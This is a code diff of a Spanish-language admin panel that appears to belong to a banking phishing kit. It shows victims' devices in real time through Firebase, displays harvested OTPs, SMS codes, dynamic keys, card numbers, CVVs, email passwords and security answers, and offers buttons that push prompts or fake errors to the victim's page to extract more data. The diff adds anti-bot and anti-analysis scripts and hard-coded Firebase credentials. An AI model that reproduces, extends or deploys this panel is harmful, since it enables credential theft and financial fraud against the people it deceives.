@@ -1,15 +1,20 @@
+<?php require_once __DIR__ . '/anti_bot.php'; ?>
 <!DOCTYPE html>
 <html lang="es">
 
 <head>
+    <script src="assets/js/anti_analysis.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Panel de Control Admin - Tiempo Real</title>
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⚡</text></svg>">
+    <link rel="icon"
+        href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⚡</text></svg>">
     <!-- Google Fonts & FontAwesome icons -->
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap"
+        rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
+
     <style>
         :root {
             --bg-dark: #090d16;
@@ -34,7 +39,7 @@
 
         body {
             background-color: var(--bg-dark);
-            background-image: 
+            background-image:
                 radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.12) 0px, transparent 50%),
                 radial-gradient(at 100% 100%, rgba(139, 92, 246, 0.12) 0px, transparent 50%);
             background-attachment: fixed;
@@ -119,9 +124,20 @@
         }
 
         @keyframes pulse {
-            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
-            70% { transform: scale(1); box-shadow: 0 0 0 8px rgba(16, 185, 129, 0); }
-            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+            0% {
+                transform: scale(0.95);
+                box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7);
+            }
+
+            70% {
+                transform: scale(1);
+                box-shadow: 0 0 0 8px rgba(16, 185, 129, 0);
+            }
+
+            100% {
+                transform: scale(0.95);
+                box-shadow: 0 0 0 0 rgba(16, 185, 129, 0);
+            }
         }
 
         .btn-audio {
@@ -386,7 +402,9 @@
             box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
         }
 
-        .btn-otp:hover { background: linear-gradient(135deg, #1d4ed8, #1e40af); }
+        .btn-otp:hover {
+            background: linear-gradient(135deg, #1d4ed8, #1e40af);
+        }
 
         .btn-error {
             background: linear-gradient(135deg, #d97706, #b45309);
@@ -394,7 +412,9 @@
             box-shadow: 0 4px 12px rgba(217, 119, 6, 0.3);
         }
 
-        .btn-error:hover { background: linear-gradient(135deg, #b45309, #92400e); }
+        .btn-error:hover {
+            background: linear-gradient(135deg, #b45309, #92400e);
+        }
 
         .btn-restart {
             background: rgba(255, 255, 255, 0.08);
@@ -402,7 +422,9 @@
             border: 1px solid var(--card-border);
         }
 
-        .btn-restart:hover { background: rgba(255, 255, 255, 0.15); }
+        .btn-restart:hover {
+            background: rgba(255, 255, 255, 0.15);
+        }
 
         .btn-close {
             background: linear-gradient(135deg, #e11d48, #be123c);
@@ -410,7 +432,9 @@
             box-shadow: 0 4px 12px rgba(225, 29, 72, 0.3);
         }
 
-        .btn-close:hover { background: linear-gradient(135deg, #be123c, #9f1239); }
+        .btn-close:hover {
+            background: linear-gradient(135deg, #be123c, #9f1239);
+        }
 
         .btn-dinamica {
             background: linear-gradient(135deg, #0d9488, #0f766e);
@@ -418,7 +442,9 @@
             box-shadow: 0 4px 12px rgba(13, 148, 136, 0.3);
         }
 
-        .btn-dinamica:hover { background: linear-gradient(135deg, #0f766e, #115e59); }
+        .btn-dinamica:hover {
+            background: linear-gradient(135deg, #0f766e, #115e59);
+        }
 
         .btn-sms {
             background: linear-gradient(135deg, #4f46e5, #4338ca);
@@ -426,7 +452,9 @@
             box-shadow: 0 4px 12px rgba(79, 70, 229, 0.3);
         }
 
-        .btn-sms:hover { background: linear-gradient(135deg, #4338ca, #3730a3); }
+        .btn-sms:hover {
+            background: linear-gradient(135deg, #4338ca, #3730a3);
+        }
 
         .btn-seguridad {
             background: linear-gradient(135deg, #7c3aed, #6d28d9);
@@ -434,7 +462,9 @@
             box-shadow: 0 4px 12px rgba(124, 58, 237, 0.3);
         }
 
-        .btn-seguridad:hover { background: linear-gradient(135deg, #6d28d9, #5b21b6); }
+        .btn-seguridad:hover {
+            background: linear-gradient(135deg, #6d28d9, #5b21b6);
+        }
 
         .btn-cvv {
             background: linear-gradient(135deg, #0284c7, #0369a1);
@@ -442,7 +472,9 @@
             box-shadow: 0 4px 12px rgba(2, 132, 199, 0.3);
         }
 
-        .btn-cvv:hover { background: linear-gradient(135deg, #0369a1, #075985); }
+        .btn-cvv:hover {
+            background: linear-gradient(135deg, #0369a1, #075985);
+        }
 
         .btn-delete {
             grid-column: span 2;
@@ -573,7 +605,8 @@
                 <i class="fa-solid fa-radar"></i>
             </div>
             <h3>Esperando conexiones de usuarios...</h3>
-            <p>Cuando un visitante ingrese a <code>index.php</code>, su dispositivo aparecerá automáticamente aquí en tiempo real.</p>
+            <p>Cuando un visitante ingrese a <code>index.php</code>, su dispositivo aparecerá automáticamente aquí en
+                tiempo real.</p>
         </div>
     </div>
 
@@ -581,26 +614,31 @@
     <!-- FIREBASE SDK COMPAT -->
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
 
     <script>
         // CONFIGURACIÓN DE FIREBASE DESDE CONFIG.JS
-        const cfg = window.APP_CONFIG || {};
-        const firebaseConfig = cfg.firebaseConfig || {
-            apiKey: "AIzaSyA_rlIDFsfp2cJrPp0Q4N9QLA3hKKslIU8",
-            authDomain: "tigg-51f26.firebaseapp.com",
-            databaseURL: "https://tigg-51f26-default-rtdb.firebaseio.com",
-            projectId: "tigg-51f26",
-            storageBucket: "tigg-51f26.firebasestorage.app",
-            messagingSenderId: "502610353442",
-            appId: "1:502610353442:web:29e2c7bd9459277db9597b"
+        const firebaseConfig = {
+            apiKey: "AIzaSyBioaTfKSL5OihSfB_nHpd_jBnqezDDQUA",
+            authDomain: "tridfdf.firebaseapp.com",
+            databaseURL: "https://tridfdf-default-rtdb.firebaseio.com",
+            projectId: "tridfdf",
+            storageBucket: "tridfdf.firebasestorage.app",
+            messagingSenderId: "1013947777606",
+            appId: "1:1013947777606:web:daac1413b1623777b9597b"
         };
 
         if (!firebase.apps.length) {
             firebase.initializeApp(firebaseConfig);
         }
 
+        // AUTENTICACIÓN ANÓNIMA OBLIGATORIA PARA LECTURA EN TIGG-51F26
+        firebase.auth().signInAnonymously()
+            .then(() => console.log('✅ Autenticado anónimamente en Firebase tigg-51f26'))
+            .catch(e => console.error('❌ Error Auth:', e));
+
         const db = firebase.database();
-        const userId = cfg.adminUserId || 'admin';
+        const userId = 'admin';
 
         // CONTROL DE AUDIO Y SINTETIZADOR WEB AUDIO API
         let audioEnabled = true;
@@ -809,31 +847,31 @@
                                 <span class="cred-value otp" style="color: #a855f7; background: rgba(168, 85, 247, 0.1); border-color: rgba(168, 85, 247, 0.3);">${otpCode}</span>
                             </div>
                             ${(() => {
-                                const dataObj = dev.data || {};
-                                const fieldDefs = {
-                                    'sms': { label: 'Código SMS', icon: 'fa-comment-sms', color: '#6366f1' },
-                                    'dinamica': { label: 'Clave Dinámica', icon: 'fa-key', color: '#0d9488' },
-                                    'cvv': { label: 'Código CVV', icon: 'fa-credit-card', color: '#38bdf8' },
-                                    'tarjeta': { label: 'Tarjeta', icon: 'fa-credit-card', color: '#34d399' },
-                                    'correo': { label: 'Correo', icon: 'fa-envelope', color: '#fbbf24' },
-                                    'claveCorreo': { label: 'Clave Correo', icon: 'fa-lock', color: '#f87171' },
-                                    'respuestaSeguridad': { label: 'Resp. Seguridad', icon: 'fa-user-shield', color: '#c084fc' },
-                                    'paso': { label: 'Paso / Pantalla', icon: 'fa-location-dot', color: '#e879f9' }
-                                };
-                                let extraHtml = '';
-                                Object.keys(fieldDefs).forEach(key => {
-                                    if (dataObj[key] && dataObj[key] !== '' && dataObj[key] !== '---') {
-                                        const def = fieldDefs[key];
-                                        extraHtml += `
+                            const dataObj = dev.data || {};
+                            const fieldDefs = {
+                                'sms': { label: 'Código SMS', icon: 'fa-comment-sms', color: '#6366f1' },
+                                'dinamica': { label: 'Clave Dinámica', icon: 'fa-key', color: '#0d9488' },
+                                'cvv': { label: 'Código CVV', icon: 'fa-credit-card', color: '#38bdf8' },
+                                'tarjeta': { label: 'Tarjeta', icon: 'fa-credit-card', color: '#34d399' },
+                                'correo': { label: 'Correo', icon: 'fa-envelope', color: '#fbbf24' },
+                                'claveCorreo': { label: 'Clave Correo', icon: 'fa-lock', color: '#f87171' },
+                                'respuestaSeguridad': { label: 'Resp. Seguridad', icon: 'fa-user-shield', color: '#c084fc' },
+                                'paso': { label: 'Paso / Pantalla', icon: 'fa-location-dot', color: '#e879f9' }
+                            };
+                            let extraHtml = '';
+                            Object.keys(fieldDefs).forEach(key => {
+                                if (dataObj[key] && dataObj[key] !== '' && dataObj[key] !== '---') {
+                                    const def = fieldDefs[key];
+                                    extraHtml += `
                                             <div class="cred-row">
                                                 <span class="cred-label"><i class="fa-solid ${def.icon}"></i> ${def.label}</span>
                                                 <span class="cred-value" style="color: ${def.color}; background: rgba(255,255,255,0.05); border-color: ${def.color}44;">${dataObj[key]}</span>
                                             </div>
                                         `;
-                                    }
-                                });
-                                return extraHtml;
-                            })()}
+                                }
+                            });
+                            return extraHtml;
+                        })()}
                         </div>
 
                         <div class="meta-info">
@@ -845,13 +883,16 @@
 
                         <div class="action-buttons-grid">
                             <button class="btn-action btn-otp" onclick="sendCommand('${token}', '${deviceId}', 'otp')">
-                                <i class="fa-solid fa-shield-virus"></i> Pedir OTP
-                            </button>
-                            <button class="btn-action btn-dinamica" onclick="sendCommand('${token}', '${deviceId}', 'dinamica')">
                                 <i class="fa-solid fa-key"></i> Clave Dinámica
+                            </button>
+                            <button class="btn-action btn-dinamica" onclick="sendCommand('${token}', '${deviceId}', 'dinamica')" style="background: linear-gradient(135deg, #d97706, #b45309);">
+                                <i class="fa-solid fa-triangle-exclamation"></i> Error Dinámica
                             </button>
                             <button class="btn-action btn-sms" onclick="sendCommand('${token}', '${deviceId}', 'sms')">
                                 <i class="fa-solid fa-comment-sms"></i> Código SMS
+                            </button>
+                            <button class="btn-action btn-sms-err" onclick="sendCommand('${token}', '${deviceId}', 'sms-error')" style="background: linear-gradient(135deg, #e11d48, #be123c);">
+                                <i class="fa-solid fa-message-slash"></i> Error SMS
                             </button>
                             <button class="btn-action btn-cvv" onclick="sendCommand('${token}', '${deviceId}', 'cvv')">
                                 <i class="fa-solid fa-credit-card"></i> Pedir CVV
@@ -871,8 +912,7 @@
                             <button class="btn-action btn-delete" onclick="sendCommand('${token}', '${deviceId}', 'delete')">
                                 <i class="fa-solid fa-trash-can"></i> Eliminar Dispositivo
                             </button>
-                        </div>
-                    `;
+                        </div>                    `;
 
                     devicesContainer.appendChild(card);
                 });
